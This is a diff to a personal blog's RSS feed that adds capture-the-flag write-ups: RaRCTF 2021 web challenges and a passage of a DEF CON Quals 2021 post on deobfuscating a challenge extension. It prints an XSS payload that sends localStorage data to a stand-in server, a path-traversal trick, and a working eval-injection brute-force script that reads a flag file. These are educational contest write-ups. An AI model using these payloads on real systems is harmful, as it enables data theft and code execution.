@@ -5,8 +5,298 @@
         <description>Recent content in Posts on Jam ⇆ Vie</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 04 Apr 2021 03:12:16 -0600</lastBuildDate>
+        <lastBuildDate>Mon, 09 Aug 2021 13:49:21 -0700</lastBuildDate>
         <atom:link href="https://jamvie.net/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>RaRCTF2021: Some simpler web probz</title>
+            <link>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</link>
+            <pubDate>Mon, 09 Aug 2021 13:49:21 -0700</pubDate>
+            
+            <guid>https://jamvie.net/posts/2021/08/rarctf2021-some-simpler-web-probz/</guid>
+            <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
+Insert as your payload:
+title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&amp;quot;flag&amp;quot;))); And report to admin. Careful with the wait times&amp;hellip;
+NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>
+            <content type="html"><![CDATA[<h2 id="fancy-button-generator--fbg">Fancy Button Generator // FBG</h2>
+<p>A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&rsquo;re stealing admin&rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.</p>
+<p>Insert as your payload:</p>
+<pre><code>title: eh
+link: javascript:fetch('your.server?fleg='%2B(window.localStorage.getItem(&quot;flag&quot;)));
+
+</code></pre><p>And report to admin. Careful with the wait times&hellip;</p>
+<p>NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure. I&rsquo;m not aware of how the solution would have looked with the accompanying pow, unfortunately.</p>
+<p>flag: <code>rarctf{th0s3_f4ncy_butt0n5_w3r3_t00_cl1ck4bl3_f0r_u5_a4667cb69f}</code></p>
+<h2 id="secure-uploader">Secure Uploader</h2>
+<p>In the provided source, observe this piece of code:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/file/&lt;id&gt;&#39;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">file</span>(id):
+    conn <span style="color:#f92672">=</span> db()
+    cur <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>cursor()
+    cur<span style="color:#f92672">.</span>execute(<span style="color:#e6db74">&#34;select path from files where id=?&#34;</span>, (id,))
+    res <span style="color:#f92672">=</span> cur<span style="color:#f92672">.</span>fetchone()
+    <span style="color:#66d9ef">if</span> res <span style="color:#f92672">is</span> None:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;File not found&#34;</span>, <span style="color:#ae81ff">404</span>
+    <span style="color:#66d9ef">with</span> open(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;uploads/&#34;</span>, res[<span style="color:#ae81ff">0</span>]), <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+        <span style="color:#66d9ef">return</span> (os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(<span style="color:#e6db74">&#34;uploads/&#34;</span>, res[<span style="color:#ae81ff">0</span>]))
+</code></pre></div><p>python&rsquo;s <code>os.path.join</code> is a unique thing: its purpose is to concat the provided parameters, appending one after the other with a <code>/</code> character in between. As an example, <code>os.path.join('foo','bar')</code> would produce <code>foo/bar</code>. However, specify an absolute filepath as a parameter, and everything before that string will be erased. So, <code>os.path.join('foo', '/bar')</code> would produce just <code>/bar</code>. We can use this knowledge to provide to the challenge a filename such as <code>//flag</code> which will resolve to retrieve the flag kept in the root directory of the docker container hosting the challenge.</p>
+<p>flag: <code>rarctf{4lw4y5_r34d_th3_d0c5_pr0p3rly!-71ed16}</code></p>
+<h2 id="maas-1calculator">MAAS 1//Calculator</h2>
+<p>The first part of &ldquo;Microservices as a Service&rdquo; was a challenge that involved improper use of the python function <code>eval()</code>.</p>
+<p>In the provided source, we see some very interesting code in <code>arithmetic/app.py</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/arithmetic&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">arithmetic</span>():
+    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;add&#39;</span>):
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f<span style="color:#e6db74">&#39;http://arithmetic:3000/add?n1={request.form.get(&#34;n1&#34;)}&amp;n2={request.form.get(&#34;n2&#34;)}&#39;</span>)
+    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;sub&#39;</span>):
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f<span style="color:#e6db74">&#39;http://arithmetic:3000/sub?n1={request.form.get(&#34;n1&#34;)}&amp;n2={request.form.get(&#34;n2&#34;)}&#39;</span>)
+    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;div&#39;</span>):
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f<span style="color:#e6db74">&#39;http://arithmetic:3000/div?n1={request.form.get(&#34;n1&#34;)}&amp;n2={request.form.get(&#34;n2&#34;)}&#39;</span>)
+    <span style="color:#66d9ef">elif</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;mul&#39;</span>):
+        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(f<span style="color:#e6db74">&#39;http://arithmetic:3000/mul?n1={request.form.get(&#34;n1&#34;)}&amp;n2={request.form.get(&#34;n2&#34;)}&#39;</span>)
+    result <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>json()
+    <span style="color:#66d9ef">print</span>(result)
+    res <span style="color:#f92672">=</span> result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;result&#39;</span>)
+    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> res:
+        <span style="color:#66d9ef">return</span> str(result<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;error&#39;</span>))
+    <span style="color:#66d9ef">try</span>:
+        res_type <span style="color:#f92672">=</span> type(eval(res))
+        <span style="color:#66d9ef">if</span> res_type <span style="color:#f92672">is</span> int <span style="color:#f92672">or</span> res_type <span style="color:#f92672">is</span> float:
+            <span style="color:#66d9ef">return</span> str(res)
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Result is not a number&#34;</span>
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">NameError</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Result is invalid&#34;</span>
+</code></pre></div><p>This would run when you perform any arithmetic action using the calculator. When using the calculator, if you try to do an addition formula like &ldquo;1+1&rdquo;, the returned result isn&rsquo;t 2, but &ldquo;11&rdquo;. Why is that?</p>
+<p>The program passes your code into <code>eval()</code>, but the result of that <code>eval()</code> isn&rsquo;t returned anywhere. If the eval&rsquo;d result was an integer, then the <em>string</em> that was passed as a parameter to <code>eval()</code> would be returned, hence why &ldquo;11&rdquo; is returned as the result of &ldquo;1+1&rdquo;. However, <code>eval()</code> is called nonetheless, and we can use this to our advantage.</p>
+<p>First and foremost, if the result of the eval was a number (int or float), then the string is returned. Else, &ldquo;Result is not a number&rdquo; or &ldquo;Result is invalid&rdquo; is returned. We could use this as a boolean condition with the following string:</p>
+<pre><code>eval(&quot;1 if (open('../flag.txt','r').read(-1).startswith('rarctf{')) else 'false'&quot;)
+</code></pre><p>We can instead put this as our &ldquo;arithmetic&rdquo; equation. Since the POST request made to the endpoint requires 2 params to be operated on, &ldquo;n1&rdquo; and &ldquo;n2&rdquo;, split this statement into 2 arbitrary halves and put 1 half into the &ldquo;n1&rdquo; param, and the other into the &ldquo;n2&rdquo; param.</p>
+<p>What this does is it calls <code>eval()</code> once more, but in this 2nd call we have more freedom to stipulate what can be evaluated. The param to the inner <code>eval</code> is just an if statement that returns the integer <code>1</code> if <code>(open('../flag.txt','r').read(-1).startswith('rarctf{'))</code> returns the boolean value true, or returns the string <code>'false'</code> if the statement returns the boolean value false.</p>
+<p>Therefore, if the contents of <code>flag.txt</code> start with the prefix &ldquo;rarctf{&rdquo;, then the <code>eval()</code> functions will return 1, and the maas program would return the whole string as a result. If it doesn&rsquo;t start with that prefix, then the <code>eval()</code> functions would return the string &lsquo;false&rsquo; and the if statement that checks the <code>res_type</code> would not return our string. From here, we can just continue to add characters to the prefix to brute-force the value of the flag that way: if we get back our string, then the character we guessed is in the flag. If we get back either &ldquo;Result is not a number&rdquo; or &ldquo;Result is invalid&rdquo; (or just if the response text has the keyword &ldquo;Result&rdquo;), then the character we guessed is not in the flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">import</span> requests
+
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://maas.rars.win/calculator&#34;</span>
+
+alphabet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;abcdefghijklmnopqrstuvwxyz1234567890_-{}&#39;</span>
+
+prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;rarctf{&#39;</span>
+
+<span style="color:#75715e">#I just chose 40 arbitrarily. If the flag was longer, I would have increased the range.</span>
+<span style="color:#66d9ef">for</span> index <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">40</span>):
+    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> alphabet:
+        <span style="color:#75715e">#our string. We will bruteforce the flag character by character. By convention, we at least know the flag starts with &#39;rarctf{&#39;</span>
+        req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;eval(</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">1 if (open(&#39;../flag.txt&#39;,&#39;r&#39;).read(-1).startswith(&#39;&#34;</span> <span style="color:#f92672">+</span> prefix <span style="color:#f92672">+</span> c <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&#39;)) else &#39;false&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#75715e">#I split the string between the n1 and n2 params arbitrarily. It doesnt matter how you split them.</span>
+        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;mode&#34;</span>: <span style="color:#e6db74">&#34;arithmetic&#34;</span>, <span style="color:#e6db74">&#34;n1&#34;</span>: req, <span style="color:#e6db74">&#34;add&#34;</span>: <span style="color:#e6db74">&#34;+&#34;</span>, <span style="color:#e6db74">&#34;n2&#34;</span>: <span style="color:#e6db74">&#34;)&#34;</span>}
+        resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url, data)
+        <span style="color:#75715e">#if we dont find the word &#34;Result&#34; in the response to our request above, then that means the character we guessed is in the flag!</span>
+        <span style="color:#66d9ef">if</span> (resp<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#34;Result&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">and</span> (resp<span style="color:#f92672">.</span>status_code <span style="color:#f92672">!=</span> <span style="color:#ae81ff">500</span>):
+            prefix <span style="color:#f92672">+=</span> c
+            <span style="color:#66d9ef">print</span>(prefix)
+            <span style="color:#66d9ef">continue</span>
+</code></pre></div><p>flag: <code>rarctf{0v3rk1ll_4s_4_s3rv1c3_3fca0faa}</code></p>
+<p>part 2: coming soon :)</p>
+<p><strong>Vie</strong></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>DEF CON Quals 2021: Getting Gud &#43; threefactooorx</title>
+            <link>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</link>
+            <pubDate>Sun, 11 Apr 2021 00:07:54 -0600</pubDate>
+            
+            <guid>https://jamvie.net/posts/2021/04/def-con-quals-2021-getting-gud-threefactooorx/</guid>
+            <description>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once
+DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&amp;rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had 1 web challenge - which was more like reversing, but I&amp;rsquo;ll take what I can get.</description>
+            <content type="html"><![CDATA[<p><strong>AKA - How I spent some time reading custom partially-deobfuscated javascript code and actually used the Chrome debugger for once</strong></p>
+<p>DEF CON - undoubtedly the most notorious, famous and recgonized CTF out there. Even people who don&rsquo;t do hacking know about DEF CON. The qualifiers, an event that took place this last weekend, ran for roughly 2 days and had <strong>1</strong> web challenge - which was more like reversing, but I&rsquo;ll take what I can get.</p>
+<h2 id="def-con-from-someone-who-thinks-shes-wildly-out-of-her-depth">DEF CON, from someone who thinks she&rsquo;s wildly out of her depth</h2>
+<p>Anyone who is anybody in the hacker space knows about DEF CON. It is <em>the</em> top CTF to really form a reputation out of. If you won DEF CON, you&rsquo;ve found yourself at the top, to say the least. DEF CON has been an established security conference and CTF for years, long before I ever joined the scene. If you ever took a look at my FAQ, you&rsquo;ll know that being a part of DEF CON in any capacity was a lofty goal of mine. I may like CTFs, but to be on the level where I&rsquo;m up against other top teams in the DEF CON leaderboard is truly a mark of recognition I would have to earn.</p>
+<p>I still have a long way to go, but I am glad that my team and I worked hard to land among the top 25 of DEF CON Qualifiers 2021 edition. This is big for us, given how we are still a recently new team (We only started in Feb of 2019), and we were the only Canadian team to land that good this year. Hopefully, next year, we can work harder to beat our own score! Maybe until then I&rsquo;ll brush up on my reversing skills so I don&rsquo;t do nothing for the first day :P</p>
+<p>Landing a respectable position among the top 25 teams in DEF CON Quals is still a fact I&rsquo;m absorbing and attempting to process. I know my team, and I know my team members all work hard and push against their limits to learn and grow. I&rsquo;m extremely proud of each and every one of them, and certainly, I&rsquo;m happy at myself for even solving a DEF CON challenge in the first place.</p>
+<p>I&rsquo;d like to think that as I progress in the CTF world, every little victory will be celebrated and recognized. At this same time one year ago, I was thinking to myself how much I needed to do to catch up to both my teammates, and to others in the CTF world who seemed to be a on a level beyond me. I still have quite a bit of climbing to do, but allow me a minute to indulge myself and be proud of what I was able to learn in a short period of time.</p>
+<h2 id="threefactooorx">Threefactooorx</h2>
+
+    <img src="/images/DEFCONQUALS2021-meme.jpeg"  alt="webgang is sad"  class="center"  style="border-radius: 8px;"  />
+
+
+<p><em>pic from <a href="https://twitter.com/oooverflow/status/1388764308838912000?s=20">ooo on twitter</a></em></p>
+<p>The challenge, threefactooorx involved de-obfuscating some horrid js file and then satisfying the checks that it went through, to grab the flag. Specifically, you had to create an html file that checked all the boxes, and give that html file to an admin entity - who likely has the same extension - and they would send back a screenshot of what the html file looked like, loaded on their end.</p>
+<p>Funnily enough, this also seemed like a perfect challenge to practise chrome ndays, but despite thinking about it I didn&rsquo;t end up doing that - <a href="https://twitter.com/r4j0x00/status/1389064716723519489?s=20">but you could totally do it, if you wanted to</a>.</p>
+
+    <img src="/images/DEFCONQUALS2021-chromenday.png"  alt="satisfies all checks"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Source was provided - it was actually a chrome extension you could load into your browser. Like mentioned earlier, the <code>content_script.js</code> was a giant, obfuscated-to-hell JavaScript file that&hellip; did stuff.</p>
+<p>Well, specifically, it performed some checks that, after trying it out with opening html files locally, would run on each load if it was enabled. Again, the file was obfuscated, but the very last line of the script was interesting.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#a6e22e">nodesadded</span> <span style="color:#f92672">==</span> 
+    <span style="color:#ae81ff">0x1</span> <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x27a</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3</span> <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x3f8</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x4cd</span> <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x3</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#a6e22e">_0x39523f</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x157</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ae</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x17e</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1c2</span>)](<span style="color:#a6e22e">nodesdeleted</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1b66</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x14e</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x25d9</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">attrcharsadded</span> <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x2001</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x2</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x433</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x49</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8e</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#e6db74">&#39;DvvtZ&#39;</span>](<span style="color:#a6e22e">domvalue</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0xed7</span> <span style="color:#f92672">*</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1</span> <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x18f0</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x12a5</span>) <span style="color:#f92672">&amp;&amp;</span> (document[<span style="color:#e6db74">&#39;getElement&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x39523f</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0xf2</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x127</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x132</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x153</span>)](<span style="color:#a6e22e">_0x5773c7</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x141</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x1ab</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x16f</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x192</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x5773c7</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0x131</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x15d</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x10d</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0xc2</span>))[<span style="color:#e6db74">&#39;value&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x336e82</span>[<span style="color:#a6e22e">_0x5773c7</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">0xe7</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0xda</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x11f</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">0x111</span>)]);
+</code></pre></div><p>What are these local variables? What do they hold?</p>
+<p>Now we turn to actually de-obfuscating the damn thing. There was a function, <code>OOO_0x1e05</code>, that we could see throughout the entirety of <code>content_script.js</code>. From the looks of it, it seemed as though <code>OOO_0x1e05</code> was a custom de-obfuscator that the challenge was using. Based on this, we could regex match and replace many of the complex bits and pieces into readable strings, to make the js somewhat more easy on the eyes. Robert Xiao did the regex matching, and the previous snippet of code above now looks like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x10b2d5</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x5ebd2a</span>,
+        <span style="color:#a6e22e">_0xd26915</span> <span style="color:#f92672">=</span> {};
+    <span style="color:#a6e22e">_0xd26915</span>[<span style="color:#e6db74">&#39;getflag&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#e6db74">&#39;xOsuT&#39;</span>], <span style="color:#a6e22e">chrome</span>[<span style="color:#e6db74">&#39;runtime&#39;</span>][<span style="color:#e6db74">&#39;sendMessag&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;e&#39;</span>](<span style="color:#a6e22e">_0xd26915</span>, <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x336e82</span>) {
+        <span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x336e82</span>[<span style="color:#e6db74">&#39;flag&#39;</span>], <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#e6db74">&#39;KShsG&#39;</span>](<span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#e6db74">&#39;bppSB&#39;</span>], <span style="color:#a6e22e">_0x336e82</span>[<span style="color:#e6db74">&#39;flag&#39;</span>]));
+        <span style="color:#a6e22e">nodesadded</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#e6db74">&#39;yRdwv&#39;</span>](<span style="color:#a6e22e">nodesdeleted</span>, <span style="color:#ae81ff">3</span>) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">attrcharsadded</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">23</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_0x10b2d5</span>.<span style="color:#a6e22e">DvvtZ</span>(<span style="color:#a6e22e">domvalue</span>, <span style="color:#ae81ff">2188</span>) <span style="color:#f92672">&amp;&amp;</span> (document[<span style="color:#e6db74">&#39;getElement&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;ById&#39;</span>](<span style="color:#e6db74">&#39;thirdfacto&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;oor&#39;</span>)[<span style="color:#e6db74">&#39;value&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x336e82</span>[<span style="color:#e6db74">&#39;flag&#39;</span>]);
+        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x369bcb</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#39;createElem&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;ent&#39;</span>](<span style="color:#a6e22e">_0x10b2d5</span>[<span style="color:#e6db74">&#39;SxgOB&#39;</span>]);
+        <span style="color:#a6e22e">_0x369bcb</span>[<span style="color:#e6db74">&#39;setAttribu&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;te&#39;</span>](<span style="color:#e6db74">&#39;id&#39;</span>, <span style="color:#a6e22e">_0x10b2d5</span>.<span style="color:#a6e22e">hxkyy</span>), document[<span style="color:#e6db74">&#39;body&#39;</span>][<span style="color:#e6db74">&#39;appendChil&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;d&#39;</span>](<span style="color:#a6e22e">_0x369bcb</span>);
+    });
+</code></pre></div><p>&hellip;Which is, better, at least. I <em>can</em> actually read it and understand what&rsquo;s going on, and this is what you can glean from this hellcode:</p>
+<ul>
+<li>
+<p>The extension was, as mentioned earlier, performing checks on the HTML file you visit. These checks see if it was doing the following things under an HTML node with id called <code>3fa</code>:</p>
+<ul>
+<li>added 5 nodes</li>
+<li>deleted 3 nodes</li>
+<li>had a total <code>attrcharsadded</code> count of 23</li>
+<li>had a domvalue of 2188</li>
+</ul>
+</li>
+<li>
+<p>If the checks above were satisfied it would look for an element called <code>thirdfactooor</code> and give it the value of the flag.</p>
+</li>
+</ul>
+<p>So, in summary, add 5 nodes, delete 3, have some attribute with 23 characters in it, and have a &ldquo;domvalue&rdquo; of 2188. The addition and subtraction of HTML nodes is easy enough to do in Javascript, but the other 2 require some explanation: <code>attrcharsadded</code> is a local variable whose value is assigned as so:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">_0x55a6f1</span>.<span style="color:#a6e22e">qieKm</span>(<span style="color:#a6e22e">_0x55a6f1</span>[<span style="color:#e6db74">&#39;MRogb&#39;</span>], <span style="color:#a6e22e">_0x55a6f1</span>[<span style="color:#e6db74">&#39;MRogb&#39;</span>])) <span style="color:#a6e22e">attrcharsadded</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">_0x8a010b</span>[<span style="color:#e6db74">&#39;attributeName&#39;</span>][<span style="color:#e6db74">&#39;length&#39;</span>];
+</code></pre></div><p>Hard to fully understand what this code does, but the last part is what to focus on: the length of the <code>attributeName</code> is added to the value of <code>attrcharsadded</code>. This means we need some attribute with a name that is exactly 23 characters to satisfy this <code>attrcharsadded</code> check.</p>
+<p>The domvalue is computed in the <code>check_dom</code> function, which has a lot going on:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_dom</span>() {
+   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x525a15</span> <span style="color:#f92672">=</span> {};
+   <span style="color:#a6e22e">_0x525a15</span>.<span style="color:#a6e22e">wmicU</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x1a77be</span>, <span style="color:#a6e22e">_0x3e38f4</span>) {
+       <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x1a77be</span>(<span style="color:#a6e22e">_0x3e38f4</span>);
+   }, <span style="color:#a6e22e">_0x525a15</span>[<span style="color:#e6db74">&#39;ueJYA&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x500490</span>, <span style="color:#a6e22e">_0x3c0a68</span>) {
+       <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x500490</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">_0x3c0a68</span>;
+   }, <span style="color:#a6e22e">_0x525a15</span>[<span style="color:#e6db74">&#39;hJFjw&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0x410572</span>, <span style="color:#a6e22e">_0x33660a</span>) {
+       <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0x410572</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">_0x33660a</span>;
+   }, <span style="color:#a6e22e">_0x525a15</span>.<span style="color:#a6e22e">KoOZC</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;#thirdfactooor&#39;</span>, <span style="color:#a6e22e">_0x525a15</span>[<span style="color:#e6db74">&#39;RkNoD&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;INPUT&#39;</span>, <span style="color:#a6e22e">_0x525a15</span>[<span style="color:#e6db74">&#39;QwGfh&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;QzIrw&#39;</span>, <span style="color:#a6e22e">_0x525a15</span>[<span style="color:#e6db74">&#39;IKmUR&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;cunYq&#39;</span>, <span style="color:#a6e22e">_0x525a15</span>[<span style="color:#e6db74">&#39;TCJdK&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">_0xee8465</span>, <span style="color:#a6e22e">_0x43b0b6</span>) {
+       <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_0xee8465</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">_0x43b0b6</span>;
+   };
+   <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">_0x2c0eff</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_0x525a15</span>;
+   <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_0x1e6746</span> <span style="color:#f92672">=</span> document[<span style="color:#e6db74">&#39;getElementById&#39;</span>](<span style="color:#e6db74">&#39;3fa&#39;</span>);
